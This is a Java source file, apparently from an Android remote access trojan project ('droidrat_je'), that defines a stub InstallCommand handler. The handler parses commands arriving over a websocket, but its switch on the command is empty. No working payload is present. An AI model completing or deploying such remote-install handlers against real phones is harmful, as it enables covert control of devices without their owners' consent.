package com.je_chen.droidrat_je.command;


import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.modules.appinstall.InstallApp;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class InstallCommand extends CommandFather {

    private InstallApp installApp;

    public InstallCommand() {
        installApp = new InstallApp();
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
